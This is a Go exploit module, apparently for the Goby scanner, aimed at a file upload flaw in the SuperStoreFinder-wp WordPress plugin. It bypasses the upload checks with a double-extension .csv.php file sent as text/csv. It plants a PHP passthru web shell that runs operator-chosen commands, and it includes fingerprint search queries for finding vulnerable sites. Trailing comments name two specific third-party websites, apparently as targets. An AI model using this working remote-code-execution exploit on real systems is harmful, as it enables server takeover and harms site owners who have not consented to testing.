package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin SuperStoreFinder-wp import.php File Upload Vulnerability",
    "Description": "<p>WordPress Plugin SuperStoreFinder-wp is a plugin with precise geolocation built in to let customers route and reach your store outlets in the easiest way.</p><p>The WordPress Plugin SuperStoreFinder-wp plugin does not properly check file uploads. An attacker can set the Content-Type header to text/csv and use double extensions to bypass the existing checks. An attacker can upload malicious files to gain server permissions.</p>",
    "Product": "wordpress-plugin-superstorefinder-wp",
    "Homepage": "https://superstorefinder.net/",
    "DisclosureDate": "2023-02-06",
    "Author": "h1ei1",
    "FofaQuery": "body=\"wp-content/plugins/superstorefinder-wp\"",
    "GobyQuery": "body=\"wp-content/plugins/superstorefinder-wp\"",
    "Level": "3",
    "Impact": "<p>The WordPress Plugin SuperStoreFinder-wp plugin does not properly check file uploads. An attacker can set the Content-Type header to text/csv and use double extensions to bypass the existing checks. An attacker can upload malicious files to gain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://superstorefinder.net/.\">https://superstorefinder.net/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "WordPress SuperStoreFinder-wp 插件 import.php 任意文件上传漏洞",
            "Product": "wordpress-plugin-superstorefinder-wp",
            "Description": "<p>WordPress SuperStoreFinder-wp 是一款内置了精确的地理位置，让客户以最简单的方式路由和到达您的商店网点的插件。</p><p>WordPress SuperStoreFinder-wp 插件没有正确检查文件上传，攻击者可以将Content-Type标头设置为text/csv，并使用双扩展来绕过现有的检查，攻击者可上传恶意文件获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://superstorefinder.net/\">https://superstorefinder.net/</a>。<br></p>",
            "Impact": "<p>WordPress SuperStoreFinder-wp 插件没有正确检查文件上传，攻击者可以将Content-Type标头设置为text/csv，并使用双扩展来绕过现有的检查，攻击者可上传恶意文件获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin SuperStoreFinder-wp import.php File Upload Vulnerability",
            "Product": "wordpress-plugin-superstorefinder-wp",
            "Description": "<p>WordPress Plugin SuperStoreFinder-wp is a plugin with precise geolocation built in to let customers route and reach your store outlets in the easiest way.<br></p><p>The WordPress Plugin SuperStoreFinder-wp plugin does not properly check file uploads. An attacker can set the Content-Type header to text/csv and use double extensions to bypass the existing checks. An attacker can upload malicious files to gain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://superstorefinder.net/.\">https://superstorefinder.net/.</a><br></p>",
            "Impact": "<p>The WordPress Plugin SuperStoreFinder-wp plugin does not properly check file uploads. An attacker can set the Content-Type header to text/csv and use double extensions to bypass the existing checks. An attacker can upload malicious files to gain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------61952268337452675651047936648")
			cfg.Data = "-----------------------------61952268337452675651047936648\r\nContent-Disposition: form-data; name=\"default_location\"; filename=\"test.csv.php\"\r\nContent-Type: text/csv\r\n\r\n<?php echo md5(233);unlink(__FILE__);?>\r\n\r\n-----------------------------61952268337452675651047936648--\r\n"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				uri2 := "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/test.csv.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43") {
					return true
				}

				uri3 := "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/test.csv.php"
				cfg3 := httpclient.NewGetRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil && strings.Contains(resp3.RawBody, "e165421110ba03099a1c0393373c5b43") {
					return true
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------61952268337452675651047936648")
			cfg.Data = fmt.Sprintf("-----------------------------61952268337452675651047936648\r\nContent-Disposition: form-data; name=\"default_location\"; filename=\"test.csv.php\"\r\nContent-Type: text/csv\r\n\r\n<?php passthru(\"%s\"); ?>\r\n\r\n-----------------------------61952268337452675651047936648--\r\n", cmd)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {

				uri2 := "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/test.csv.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}

				uri3 := "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/test.csv.php"
				cfg3 := httpclient.NewGetRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
					expResult.Output = resp3.RawBody
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}

//https://www.asch.com.au
//https://180cakes.lamp5.cloudsites.net.au